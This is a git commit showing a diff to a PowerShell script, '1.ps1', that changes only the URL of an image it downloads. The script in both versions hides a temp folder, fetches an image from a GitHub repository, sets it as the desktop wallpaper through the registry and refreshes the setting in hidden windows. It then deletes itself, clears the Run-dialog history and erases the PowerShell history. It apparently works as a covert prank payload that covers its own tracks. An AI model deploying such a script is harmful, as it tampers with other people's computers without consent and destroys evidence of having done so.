88f39d2bd10803e9e09c40a936d7b27d4ed03fa8
Noshbit <93923548+Noshbit@users.noreply.github.com>
2022-12-01 20:11:08 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,3 +1,3 @@
-attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/literate-chainsaw/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
+attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/pink/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
 rm "$env:userprofile\temp\1.ps1";
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
